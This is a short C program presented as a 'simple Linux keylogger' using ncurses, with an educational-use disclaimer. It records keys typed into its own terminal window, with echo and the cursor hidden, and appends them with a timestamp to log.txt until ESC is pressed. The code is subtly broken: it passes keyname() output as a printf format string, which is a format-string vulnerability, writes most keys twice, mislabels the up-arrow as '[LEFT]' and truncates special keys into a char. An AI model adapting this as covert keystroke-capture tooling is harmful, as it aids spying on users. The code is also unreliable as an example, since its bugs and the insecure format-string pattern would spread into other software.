/*
    Simple LINUX keylogger using ncurses.
    Converted by Leo 2024.

    Very important note:

    To be used for educational use and not for malicious tasks!
    I will NOT be held responsible for anything silly you may do with this!

    gcc -o linux_keylogger keylogger.c -lncurses

*/
#include <limits.h>
#include <ncurses.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#define ctrl(x) (x & 0x1F)

//#define PATH                                                                   \
  "/home/your_username/Desktop/test-log.txt" // Change this path as needed

int main() {

  // PATH_MAX from limits.h
  char currentDir[PATH_MAX];
  char logFilePath[PATH_MAX + 20]; // Buffer for directory + filename

  // Get the current working directory
  if (getcwd(currentDir, sizeof(currentDir)) != NULL) {
    printf("Current working directory: %s\n", currentDir);

    // Combine directory path with the filename
    snprintf(logFilePath, sizeof(logFilePath), "%s/log.txt", currentDir);

    printf("Log file path: %s\n", logFilePath);

    // Open the log file in append mode
    FILE *logFile = fopen(logFilePath, "a");
    if (logFile == NULL) {
      perror("Error opening log file");
      return 1;
    }

    // Write to the log file
    // fprintf(logFile, "This is a log entry.\n");
    fclose(logFile);
    printf("Log entry written to %s\n", logFilePath);
  } else {
    perror("getcwd() error");
  }

  char capture;
  FILE *file;

  // Time setup.
  time_t t;
  t = time(NULL);

  // Initialize ncurses
  initscr();             // Start ncurses mode
  noecho();              // Don't echo typed characters
  nodelay(stdscr, TRUE); // Non-blocking input
  curs_set(0);           // Hide the cursor

  // file = fopen(PATH, "a+");
  file = fopen(logFilePath, "a+");
  if (file == NULL) {
    endwin();
    perror("Error opening log file");
    return 1;
  }

  fprintf(file, "\n#$Logger: Started logging @ %s", ctime(&t));

  while (1) {
    usleep(20000);     // Sleep for 20 ms to reduce CPU usage
    capture = getch(); // Get the pressed key (non-blocking)

    if (capture != ERR) { // ERR indicates no key was pressed
      // detect ctrl keys
      // source: https://www.youtube.com/watch?v=J9lJ6aabuos
      if (capture == ctrl(capture)) {
        // mvprintw(0, 0, "%c pressed", keyname(capture));
        fprintf(file, keyname(capture));
      }
      fprintf(file, keyname(capture));
      switch ((int)capture) {
      case ' ': // Space key
        fprintf(file, "[SPACE]");
        break;
      case 0x09: // Tab key
        fprintf(file, "[TAB]");
        break;
      case 0x0A: // Enter key
        fprintf(file, "[ENTER]");
        break;
      case 0x1B: // Escape key
        fprintf(file, "[ESC]");
        fclose(file);
        endwin();
        return 0;
      case 0x7F: // Backspace key
        fprintf(file, "[BACKSPACE]");
        break;
      case KEY_UP:
        fprintf(file, "[LEFT]");
        break;
      default:
        fputc(capture, file); // Write other keys directly
      }
      fflush(file); // Ensure the data is written to the file
    }
  }

  fclose(file);
  endwin();
  return 0;
}
